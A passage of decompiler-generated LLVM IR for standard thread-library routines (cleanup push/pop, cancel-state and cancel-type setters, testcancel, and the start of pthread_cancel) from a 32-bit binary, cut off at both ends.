  br i1 %v1_8059d8b, label %dec_label_pc_8059d9d, label %dec_label_pc_8059d92

dec_label_pc_8059d92:                             ; preds = %entry
  %v0_8059d92 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8059d92 = icmp ult i32 %v0_8059d92, %v3_8059d88
  br i1 %v7_8059d92, label %dec_label_pc_8059d9d, label %dec_label_pc_8059d96

dec_label_pc_8059d96:                             ; preds = %dec_label_pc_8059d92
  %v1_8059d96 = add i32 %v0_8059d92, 12
  %v2_8059d96 = inttoptr i32 %v1_8059d96 to i32*
  store i32 0, i32* %v2_8059d96, align 4
  br label %dec_label_pc_8059d9d

dec_label_pc_8059d9d:                             ; preds = %dec_label_pc_8059d92, %entry, %dec_label_pc_8059d96
  %v0_8059d9d = load i32, i32* %edx.global-to-local, align 4
  %v1_8059d9d = add i32 %v0_8059d9d, 65
  %v2_8059d9d = inttoptr i32 %v1_8059d9d to i8*
  store i8 0, i8* %v2_8059d9d, align 1
  %v0_8059da1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059da1 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059da1 = add i32 %v1_8059da1, 60
  %v3_8059da1 = inttoptr i32 %v2_8059da1 to i32*
  store i32 %v0_8059da1, i32* %v3_8059da1, align 4
  %v2_8059da4 = load i32, i32* %stack_var_-12, align 4
  %v2_8059da6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059da6, i32* @ebx, align 4
  ret i32 %v2_8059da4

; uselistorder directives
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 1, 4 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_8059d9d, { 2, 0, 1 }
}

define i32 @_pthread_cleanup_pop(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v4_8059dac = icmp eq i32 %arg2, 0
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  br i1 %v4_8059dac, label %dec_label_pc_8059dc2, label %dec_label_pc_8059db7

dec_label_pc_8059db7:                             ; preds = %entry
  %v6_8059dbd = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_8059dbd)
  br label %dec_label_pc_8059dc2

dec_label_pc_8059dc2:                             ; preds = %entry, %dec_label_pc_8059db7
  %v0_8059dc2 = phi i32 [ %tmp7, %entry ], [ 134585791, %dec_label_pc_8059db7 ]
  %v1_8059dc2 = call i32 @thread_self.8(i32 %v0_8059dc2)
  %v0_8059dc7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059dc7 = add i32 %v0_8059dc7, 12
  %v2_8059dc7 = inttoptr i32 %v1_8059dc7 to i32*
  %v3_8059dc7 = load i32, i32* %v2_8059dc7, align 4
  %v2_8059dca = add i32 %v1_8059dc2, 60
  %v3_8059dca = inttoptr i32 %v2_8059dca to i32*
  store i32 %v3_8059dc7, i32* %v3_8059dca, align 4
  %v2_8059dcd = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059dcd, i32* @ecx, align 4
  ret i32 %v1_8059dc2

; uselistorder directives
  uselistorder label %dec_label_pc_8059dc2, { 1, 0 }
}

define i32 @_pthread_cleanup_push(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059dd1 = load i32, i32* @ebx, align 4
  store i32 %v0_8059dd1, i32* %stack_var_-4, align 4
  %v1_8059dd5 = call i32 @thread_self.8(i32 %v0_8059dd1)
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %v1_8059dd5, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %arg1, align 4
  %v2_8059dea = add i32 %tmp3, 4
  %v3_8059dea = inttoptr i32 %v2_8059dea to i32*
  store i32 %arg3, i32* %v3_8059dea, align 4
  %v0_8059ded = load i32, i32* %edx.global-to-local, align 4
  %v1_8059ded = add i32 %v0_8059ded, 60
  %v2_8059ded = inttoptr i32 %v1_8059ded to i32*
  %v3_8059ded = load i32, i32* %v2_8059ded, align 4
  %v1_8059df0 = icmp eq i32 %v3_8059ded, 0
  %v1_8059df2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8059df2 = add i32 %v1_8059df2, 12
  %v3_8059df2 = inttoptr i32 %v2_8059df2 to i32*
  store i32 %v3_8059ded, i32* %v3_8059df2, align 4
  br i1 %v1_8059df0, label %dec_label_pc_8059e02, label %dec_label_pc_8059df7

dec_label_pc_8059df7:                             ; preds = %entry
  %v0_8059df7 = load i32, i32* %ebx.global-to-local, align 4
  %v7_8059df7 = icmp ult i32 %v0_8059df7, %v3_8059ded
  br i1 %v7_8059df7, label %dec_label_pc_8059e02, label %dec_label_pc_8059dfb

dec_label_pc_8059dfb:                             ; preds = %dec_label_pc_8059df7
  %v1_8059dfb = add i32 %v0_8059df7, 12
  %v2_8059dfb = inttoptr i32 %v1_8059dfb to i32*
  store i32 0, i32* %v2_8059dfb, align 4
  br label %dec_label_pc_8059e02

dec_label_pc_8059e02:                             ; preds = %dec_label_pc_8059df7, %entry, %dec_label_pc_8059dfb
  %v0_8059e02 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8059e02 = load i32, i32* %edx.global-to-local, align 4
  %v2_8059e02 = add i32 %v1_8059e02, 60
  %v3_8059e02 = inttoptr i32 %v2_8059e02 to i32*
  store i32 %v0_8059e02, i32* %v3_8059e02, align 4
  %v2_8059e05 = load i32, i32* %stack_var_-12, align 4
  %v2_8059e07 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8059e07, i32* @ebx, align 4
  ret i32 %v2_8059e05

; uselistorder directives
  uselistorder label %dec_label_pc_8059e02, { 2, 0, 1 }
}

define i32 @__pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %tmp4 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8059e0a = load i32, i32* @ebx, align 4
  store i32 %v0_8059e0a, i32* %stack_var_-8, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v15_8059e0b = ptrtoint i32* %stack_var_-12 to i32
  %v1_8059e0e = call i32 @thread_self.8(i32 %v0_8059e0a)
  store i32 %v1_8059e0e, i32* %eax.global-to-local, align 4
  store i32 %tmp4, i32* @esi, align 4
  %v4_8059e17 = icmp eq i32 %arg2, 0
  store i1 %v4_8059e17, i1* %zf.global-to-local, align 1
  store i32 %v1_8059e0e, i32* @ebx, align 4
  br i1 %v4_8059e17, label %dec_label_pc_8059e2b, label %dec_label_pc_8059e20

dec_label_pc_8059e20:                             ; preds = %entry
  %v0_8059e20 = load i32, i32* @esp, align 4
  %v9_8059e20 = icmp eq i32 %v0_8059e20, 12
  store i1 %v9_8059e20, i1* %zf.global-to-local, align 1
  %v6_8059e26 = load i32, i32* %arg1, align 4
  call void @__pseudo_call(i32 %v6_8059e26)
  %v0_8059e28 = load i32, i32* @esp, align 4
  %v6_8059e28 = icmp eq i32 %v0_8059e28, -16
  store i1 %v6_8059e28, i1* %zf.global-to-local, align 1
  %v0_8059e2b.pre = load i32, i32* @esi, align 4
  %v0_8059e2e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8059e2b

dec_label_pc_8059e2b:                             ; preds = %entry, %dec_label_pc_8059e20
  %v1_8059e32 = phi i32 [ %v1_8059e0e, %entry ], [ %v0_8059e2e.pre, %dec_label_pc_8059e20 ]
  %v0_8059e2b = phi i32 [ %tmp4, %entry ], [ %v0_8059e2b.pre, %dec_label_pc_8059e20 ]
  %v1_8059e2b = add i32 %v0_8059e2b, 12
  %v2_8059e2b = inttoptr i32 %v1_8059e2b to i32*
  %v3_8059e2b = load i32, i32* %v2_8059e2b, align 4
  store i32 %v3_8059e2b, i32* %eax.global-to-local, align 4
  %v1_8059e2e = add i32 %v1_8059e32, 66
  %v2_8059e2e = inttoptr i32 %v1_8059e2e to i8*
  %v3_8059e2e = load i8, i8* %v2_8059e2e, align 1
  %v4_8059e2e = icmp eq i8 %v3_8059e2e, 0
  store i1 %v4_8059e2e, i1* %zf.global-to-local, align 1
  %v2_8059e32 = add i32 %v1_8059e32, 60
  %v3_8059e32 = inttoptr i32 %v2_8059e32 to i32*
  store i32 %v3_8059e2b, i32* %v3_8059e32, align 4
  %v0_8059e35 = load i32, i32* @esi, align 4
  %v1_8059e35 = add i32 %v0_8059e35, 8
  %v2_8059e35 = inttoptr i32 %v1_8059e35 to i32*
  %v3_8059e35 = load i32, i32* %v2_8059e35, align 4
  store i32 %v3_8059e35, i32* %eax.global-to-local, align 4
  %v1_8059e38 = trunc i32 %v3_8059e35 to i8
  %v2_8059e38 = load i32, i32* @ebx, align 4
  %v3_8059e38 = add i32 %v2_8059e38, 65
  %v4_8059e38 = inttoptr i32 %v3_8059e38 to i8*
  store i8 %v1_8059e38, i8* %v4_8059e38, align 1
  %v0_8059e3b = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8059e3b, label %dec_label_pc_8059e53, label %dec_label_pc_8059e3d

dec_label_pc_8059e3d:                             ; preds = %dec_label_pc_8059e2b
  %v0_8059e3d = load i32, i32* @ebx, align 4
  %v1_8059e3d = add i32 %v0_8059e3d, 64
  %v2_8059e3d = inttoptr i32 %v1_8059e3d to i16*
  %v3_8059e3d = load i16, i16* %v2_8059e3d, align 2
  %v9_8059e3d = icmp eq i16 %v3_8059e3d, 256
  store i1 %v9_8059e3d, i1* %zf.global-to-local, align 1
  %v1_8059e43 = icmp eq i1 %v9_8059e3d, false
  br i1 %v1_8059e43, label %dec_label_pc_8059e53, label %dec_label_pc_8059e45

dec_label_pc_8059e45:                             ; preds = %dec_label_pc_8059e3d
  store i32 %v15_8059e0b, i32* %eax.global-to-local, align 4
  %v2_8059e4e = call i32 @__pthread_do_exit(i32 -1, i32 %v15_8059e0b)
  store i32 %v2_8059e4e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059e53

dec_label_pc_8059e53:                             ; preds = %dec_label_pc_8059e3d, %dec_label_pc_8059e2b, %dec_label_pc_8059e45
  %v2_8059e53 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8059e53, i32* @ecx, align 4
  %v2_8059e54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8059e54, i32* @ebx, align 4
  %v2_8059e55 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8059e55, i32* @esi, align 4
  %v0_8059e56 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8059e56

; uselistorder directives
  uselistorder i1 %v9_8059e3d, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_8059e53, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059e2b, { 1, 0 }
}

define i32 @pthread_testcancel() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_8059e5a = call i32 @thread_self.8(i32 ptrtoint (i32* @0 to i32))
  %v1_8059e5f = add i32 %v1_8059e5a, 66
  %v2_8059e5f = inttoptr i32 %v1_8059e5f to i8*
  %v3_8059e5f = load i8, i8* %v2_8059e5f, align 1
  %v4_8059e5f = icmp eq i8 %v3_8059e5f, 0
  br i1 %v4_8059e5f, label %dec_label_pc_8059e79, label %dec_label_pc_8059e65

dec_label_pc_8059e65:                             ; preds = %entry
  %v1_8059e65 = add i32 %v1_8059e5a, 64
  %v2_8059e65 = inttoptr i32 %v1_8059e65 to i8*
  %v3_8059e65 = load i8, i8* %v2_8059e65, align 1
  %v4_8059e65 = icmp eq i8 %v3_8059e65, 0
  %v1_8059e69 = icmp eq i1 %v4_8059e65, false
  br i1 %v1_8059e69, label %dec_label_pc_8059e79, label %dec_label_pc_8059e6b

dec_label_pc_8059e6b:                             ; preds = %dec_label_pc_8059e65
  %v2_8059e6d = ptrtoint i32* %stack_var_0 to i32
  %v2_8059e74 = call i32 @__pthread_do_exit(i32 -1, i32 %v2_8059e6d)
  br label %dec_label_pc_8059e79

dec_label_pc_8059e79:                             ; preds = %dec_label_pc_8059e65, %entry, %dec_label_pc_8059e6b
  %v0_8059e7c = phi i32 [ %v1_8059e5a, %dec_label_pc_8059e65 ], [ %v1_8059e5a, %entry ], [ %v2_8059e74, %dec_label_pc_8059e6b ]
  ret i32 %v0_8059e7c

; uselistorder directives
  uselistorder label %dec_label_pc_8059e79, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp8, i32* %stack_var_-28, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8059e7d = load i32, i32* @ebx, align 4
  store i32 %v0_8059e7d, i32* %stack_var_-4, align 4
  %v4_8059e7d = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8059e86 = sext i8 %arg1 to i32
  %v13_8059e86 = icmp eq i8 %arg1, 1
  store i1 %v13_8059e86, i1* %zf.global-to-local, align 1
  store i32 %arg2, i32* @ebx, align 4
  %tmp14 = or i8 %arg1, 1
  %tmp15 = icmp eq i8 %tmp14, 1
  br i1 %tmp15, label %dec_label_pc_8059e91, label %dec_label_pc_8059ec7

dec_label_pc_8059e91:                             ; preds = %entry
  %v1_8059e91 = call i32 @thread_self.8(i32 %v0_8059e7d)
  store i32 %v1_8059e91, i32* %eax.global-to-local, align 4
  %v1_8059e96 = icmp eq i32 %arg2, 0
  store i1 %v1_8059e96, i1* %zf.global-to-local, align 1
  store i32 %v1_8059e91, i32* %edx.global-to-local, align 4
  br i1 %v1_8059e96, label %dec_label_pc_8059ea2, label %dec_label_pc_8059e9c

dec_label_pc_8059e9c:                             ; preds = %dec_label_pc_8059e91
  %v1_8059e9c = add i32 %v1_8059e91, 65
  %v2_8059e9c = inttoptr i32 %v1_8059e9c to i8*
  %v3_8059e9c = load i8, i8* %v2_8059e9c, align 1
  %v4_8059e9c = sext i8 %v3_8059e9c to i32
  store i32 %v4_8059e9c, i32* %eax.global-to-local, align 4
  %v2_8059ea0 = inttoptr i32 %arg2 to i32*
  store i32 %v4_8059e9c, i32* %v2_8059ea0, align 4
  %v6_8059ea2.pre = load i32, i32* %eax.global-to-local, align 4
  %v0_8059ea6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059ea2

dec_label_pc_8059ea2:                             ; preds = %dec_label_pc_8059e91, %dec_label_pc_8059e9c
  %v2_8059eaa = phi i32 [ %v1_8059e91, %dec_label_pc_8059e91 ], [ %v0_8059ea6.pre, %dec_label_pc_8059e9c ]
  %v6_8059ea2 = phi i32 [ %v1_8059e91, %dec_label_pc_8059e91 ], [ %v6_8059ea2.pre, %dec_label_pc_8059e9c ]
  %v7_8059ea2 = and i32 %v6_8059ea2, -256
  %v8_8059ea2 = or i32 %v7_8059ea2, %v4_8059e86
  store i32 %v8_8059ea2, i32* %eax.global-to-local, align 4
  %v1_8059ea6 = add i32 %v2_8059eaa, 66
  %v2_8059ea6 = inttoptr i32 %v1_8059ea6 to i8*
  %v3_8059ea6 = load i8, i8* %v2_8059ea6, align 1
  %v4_8059ea6 = icmp eq i8 %v3_8059ea6, 0
  store i1 %v4_8059ea6, i1* %zf.global-to-local, align 1
  %v3_8059eaa = add i32 %v2_8059eaa, 65
  %v4_8059eaa = inttoptr i32 %v3_8059eaa to i8*
  store i8 %arg1, i8* %v4_8059eaa, align 1
  %v0_8059ead = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8059ead, label %dec_label_pc_8059ec5, label %dec_label_pc_8059eaf

dec_label_pc_8059eaf:                             ; preds = %dec_label_pc_8059ea2
  %v0_8059eaf = load i32, i32* %edx.global-to-local, align 4
  %v1_8059eaf = add i32 %v0_8059eaf, 64
  %v2_8059eaf = inttoptr i32 %v1_8059eaf to i16*
  %v3_8059eaf = load i16, i16* %v2_8059eaf, align 2
  %v9_8059eaf = icmp eq i16 %v3_8059eaf, 256
  store i1 %v9_8059eaf, i1* %zf.global-to-local, align 1
  %v1_8059eb5 = icmp eq i1 %v9_8059eaf, false
  br i1 %v1_8059eb5, label %dec_label_pc_8059ec5, label %dec_label_pc_8059eb7

dec_label_pc_8059eb7:                             ; preds = %dec_label_pc_8059eaf
  store i32 %v4_8059e7d, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-28, align 4
  %v2_8059ec0 = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8059e7d)
  store i32 %v2_8059ec0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059ec5

dec_label_pc_8059ec5:                             ; preds = %dec_label_pc_8059eaf, %dec_label_pc_8059ea2, %dec_label_pc_8059eb7
  %stack_var_-20.0 = phi i32 [ %tmp10, %dec_label_pc_8059ea2 ], [ %tmp10, %dec_label_pc_8059eaf ], [ %arg2, %dec_label_pc_8059eb7 ]
  %stack_var_-24.0 = phi i32 [ %tmp9, %dec_label_pc_8059ea2 ], [ %tmp9, %dec_label_pc_8059eaf ], [ %v4_8059e7d, %dec_label_pc_8059eb7 ]
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8059ec7.pre = load i32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_8059ec7

dec_label_pc_8059ec7:                             ; preds = %entry, %dec_label_pc_8059ec5
  %v2_8059ec9 = phi i32 [ %tmp10, %entry ], [ %stack_var_-20.0, %dec_label_pc_8059ec5 ]
  %v2_8059ec8 = phi i32 [ %tmp9, %entry ], [ %stack_var_-24.0, %dec_label_pc_8059ec5 ]
  %v2_8059ec7 = phi i32 [ %tmp8, %entry ], [ %v2_8059ec7.pre, %dec_label_pc_8059ec5 ]
  %v0_8059eca = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059ec5 ]
  store i32 %v2_8059ec7, i32* @edx, align 4
  store i32 %v2_8059ec8, i32* @ecx, align 4
  store i32 %v2_8059ec9, i32* @ebx, align 4
  ret i32 %v0_8059eca

; uselistorder directives
  uselistorder i1 %v9_8059eaf, { 1, 0 }
  uselistorder i32 %v1_8059e91, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp10, { 2, 0, 1 }
  uselistorder i32 %tmp9, { 2, 0, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg2, { 0, 2, 3, 1 }
  uselistorder i8 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8059ec7, { 1, 0 }
  uselistorder label %dec_label_pc_8059ec5, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059ea2, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-12 = alloca i32, align 4
  %tmp14 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp14, i32* %stack_var_-12, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8059ecb = load i32, i32* @ebx, align 4
  store i32 %v0_8059ecb, i32* %stack_var_-4, align 4
  %v4_8059ecb = ptrtoint i32* %stack_var_-4 to i32
  store i32 22, i32* %eax.global-to-local, align 4
  %v4_8059ed4 = sext i8 %arg1 to i32
  %v13_8059ed4 = icmp eq i8 %arg1, 1
  store i1 %v13_8059ed4, i1* %zf.global-to-local, align 1
  store i32 %arg2, i32* @ebx, align 4
  %tmp16 = or i8 %arg1, 1
  %tmp17 = icmp eq i8 %tmp16, 1
  br i1 %tmp17, label %dec_label_pc_8059edf, label %dec_label_pc_8059f15

dec_label_pc_8059edf:                             ; preds = %entry
  %v1_8059edf = call i32 @thread_self.8(i32 %v0_8059ecb)
  store i32 %v1_8059edf, i32* %eax.global-to-local, align 4
  %v1_8059ee4 = icmp eq i32 %arg2, 0
  store i1 %v1_8059ee4, i1* %zf.global-to-local, align 1
  store i32 %v1_8059edf, i32* %edx.global-to-local, align 4
  br i1 %v1_8059ee4, label %dec_label_pc_8059ef0, label %dec_label_pc_8059eea

dec_label_pc_8059eea:                             ; preds = %dec_label_pc_8059edf
  %v1_8059eea = add i32 %v1_8059edf, 64
  %v2_8059eea = inttoptr i32 %v1_8059eea to i8*
  %v3_8059eea = load i8, i8* %v2_8059eea, align 1
  %v4_8059eea = sext i8 %v3_8059eea to i32
  store i32 %v4_8059eea, i32* %eax.global-to-local, align 4
  %v2_8059eee = inttoptr i32 %arg2 to i32*
  store i32 %v4_8059eea, i32* %v2_8059eee, align 4
  %v6_8059ef0.pre = load i32, i32* %eax.global-to-local, align 4
  %v0_8059ef4.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8059ef0

dec_label_pc_8059ef0:                             ; preds = %dec_label_pc_8059edf, %dec_label_pc_8059eea
  %v2_8059ef8 = phi i32 [ %v1_8059edf, %dec_label_pc_8059edf ], [ %v0_8059ef4.pre, %dec_label_pc_8059eea ]
  %v6_8059ef0 = phi i32 [ %v1_8059edf, %dec_label_pc_8059edf ], [ %v6_8059ef0.pre, %dec_label_pc_8059eea ]
  %v7_8059ef0 = and i32 %v6_8059ef0, -256
  %v8_8059ef0 = or i32 %v7_8059ef0, %v4_8059ed4
  store i32 %v8_8059ef0, i32* %eax.global-to-local, align 4
  %v1_8059ef4 = add i32 %v2_8059ef8, 66
  %v2_8059ef4 = inttoptr i32 %v1_8059ef4 to i8*
  %v3_8059ef4 = load i8, i8* %v2_8059ef4, align 1
  %v4_8059ef4 = icmp eq i8 %v3_8059ef4, 0
  store i1 %v4_8059ef4, i1* %zf.global-to-local, align 1
  %v3_8059ef8 = add i32 %v2_8059ef8, 64
  %v4_8059ef8 = inttoptr i32 %v3_8059ef8 to i8*
  store i8 %arg1, i8* %v4_8059ef8, align 1
  %v0_8059efb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8059efb, label %dec_label_pc_8059f13, label %dec_label_pc_8059efd

dec_label_pc_8059efd:                             ; preds = %dec_label_pc_8059ef0
  %v0_8059efd = load i32, i32* %edx.global-to-local, align 4
  %v1_8059efd = add i32 %v0_8059efd, 64
  %v2_8059efd = inttoptr i32 %v1_8059efd to i16*
  %v3_8059efd = load i16, i16* %v2_8059efd, align 2
  %v9_8059efd = icmp eq i16 %v3_8059efd, 256
  store i1 %v9_8059efd, i1* %zf.global-to-local, align 1
  %v1_8059f03 = icmp eq i1 %v9_8059efd, false
  br i1 %v1_8059f03, label %dec_label_pc_8059f13, label %dec_label_pc_8059f05

dec_label_pc_8059f05:                             ; preds = %dec_label_pc_8059efd
  store i32 %v4_8059ecb, i32* %eax.global-to-local, align 4
  %v2_8059f0e = call i32 @__pthread_do_exit(i32 -1, i32 %v4_8059ecb)
  store i32 %v2_8059f0e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8059f13

dec_label_pc_8059f13:                             ; preds = %dec_label_pc_8059efd, %dec_label_pc_8059ef0, %dec_label_pc_8059f05
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8059f15.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8059f15

dec_label_pc_8059f15:                             ; preds = %entry, %dec_label_pc_8059f13
  %v2_8059f15 = phi i32 [ %tmp14, %entry ], [ %v2_8059f15.pre, %dec_label_pc_8059f13 ]
  %v0_8059f18 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_8059f13 ]
  store i32 %v2_8059f15, i32* %edx.global-to-local, align 4
  ret i32 %v0_8059f18

; uselistorder directives
  uselistorder i1 %v9_8059efd, { 1, 0 }
  uselistorder i32 %v1_8059edf, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @thread_self.8, { 7, 0, 6, 3, 4, 5, 2, 1 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder i8 %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8059f15, { 1, 0 }
  uselistorder label %dec_label_pc_8059f13, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8059ef0, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %zf.global-to-local = alloca i1, align 1
  store i32 0, i32* @edx, align 4
  %v0_8059f1e = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_8059f28 = urem i32 %arg1, 1024
  %v2_8059f28 = icmp eq i32 %v1_8059f28, 0
  %v2_8059f2d = mul nuw nsw i32 %v1_8059f28, 16
  store i1 %v2_8059f28, i1* %zf.global-to-local, align 1
  %v1_8059f30 = add i32 %v2_8059f2d, ptrtoint (i32* @global_var_8070f20.578 to i32)
  store i32 %v1_8059f30, i32* @edi, align 4
  store i32 %v1_8059f30, i32* @eax, align 4
  %v1_8059f38 = call i32 @__pthread_lock(i32 %v0_8059f1e)
  %v0_8059f3d = load i32, i32* @edi, align 4
  %v1_8059f3d = add i32 %v0_8059f3d, 8
  %v2_8059f3d = inttoptr i32 %v1_8059f3d to i32*
  %v3_8059f3d = load i32, i32* %v2_8059f3d, align 4
  store i32 %v3_8059f3d, i32* @ebx, align 4
  %v1_8059f40 = icmp eq i32 %v3_8059f3d, 0
  store i1 %v1_8059f40, i1* %zf.global-to-local, align 1
  br i1 %v1_8059f40, label %dec_label_pc_8059f49, label %dec_label_pc_8059f44

dec_label_pc_8059f44:                             ; preds = %entry
  %v1_8059f44 = add i32 %v3_8059f3d, 16
  %v2_8059f44 = inttoptr i32 %v1_8059f44 to i32*
  %v3_8059f44 = load i32, i32* %v2_8059f44, align 4
  %v4_8059f44 = load i32, i32* @esi, align 4
  %v15_8059f44 = icmp eq i32 %v3_8059f44, %v4_8059f44
  store i1 %v15_8059f44, i1* %zf.global-to-local, align 1
  br i1 %v15_8059f44, label %dec_label_pc_8059f59, label %dec_label_pc_8059f49

dec_label_pc_8059f49:                             ; preds = %dec_label_pc_8059f44, %entry
  %v0_8059f49 = load i32, i32* @esp, align 4
  %v9_8059f49 = icmp eq i32 %v0_8059f49, 12
  store i1 %v9_8059f49, i1* %zf.global-to-local, align 1
  %v1_8059f4d = inttoptr i32 %v0_8059f3d to i32*
  %v2_8059f4d = call i32 @__pthread_unlock(i32* %v1_8059f4d)
  br label %dec_label_pc_8059fc3

dec_label_pc_8059f59:                             ; preds = %dec_label_pc_8059f44
  %v1_8059f59 = add i32 %v3_8059f3d, 64
  %v2_8059f59 = inttoptr i32 %v1_8059f59 to i8*
  %v3_8059f59 = load i8, i8* %v2_8059f59, align 1
  %v12_8059f59 = icmp eq i8 %v3_8059f59, 1
  store i1 %v12_8059f59, i1* %zf.global-to-local, align 1
  %v1_8059f5d = add i32 %v3_8059f3d, 66
  %v2_8059f5d = inttoptr i32 %v1_8059f5d to i8*
  %v3_8059f5d = load i8, i8* %v2_8059f5d, align 1
  store i8 1, i8* %v2_8059f5d, align 1
  %v0_8059f65 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_8059f65, label %dec_label_pc_8059f6b, label %dec_label_pc_8059f67

dec_label_pc_8059f67:                             ; preds = %dec_label_pc_8059f59
  %v1_8059f67 = icmp eq i8 %v3_8059f5d, 0
  store i1 %v1_8059f67, i1* %zf.global-to-local, align 1
  br i1 %v1_8059f67, label %dec_label_pc_8059f76, label %dec_label_pc_8059f6b

dec_label_pc_8059f6b:                             ; preds = %dec_label_pc_8059f67, %dec_label_pc_8059f59
  %v0_8059f6b = load i32, i32* @esp, align 4
  %v9_8059f6b = icmp eq i32 %v0_8059f6b, 12
  store i1 %v9_8059f6b, i1* %zf.global-to-local, align 1
  %v0_8059f6e = load i32, i32* @edi, align 4
  %v1_8059f6f = inttoptr i32 %v0_8059f6e to i32*
  %v2_8059f6f = call i32 @__pthread_unlock(i32* %v1_8059f6f)
  br label %dec_label_pc_8059fc1

dec_label_pc_8059f76:                             ; preds = %dec_label_pc_8059f67
  %v1_8059f76 = add i32 %v3_8059f3d, 444
  %v2_8059f76 = inttoptr i32 %v1_8059f76 to i32*
  %v3_8059f76 = load i32, i32* %v2_8059f76, align 4
  store i32 0, i32* @esi, align 4
  %v1_8059f81 = icmp eq i32 %v3_8059f76, 0
  store i1 %v1_8059f81, i1* %zf.global-to-local, align 1
  br i1 %v1_8059f81, label %dec_label_pc_8059f98, label %dec_label_pc_8059f85

dec_label_pc_8059f85:                             ; preds = %dec_label_pc_8059f76
  %v3_8059f81 = trunc i32 %v3_8059f76 to i8
  %v5_8059f8a = add i32 %v3_8059f76, 4
  %v6_8059f8a = inttoptr i32 %v5_8059f8a to i32*
  %v7_8059f8a = load i32, i32* %v6_8059f8a, align 4
  call void @__pseudo_call(i32 %v7_8059f8a)
  %v0_8059f8d = load i32, i32* @esp, align 4
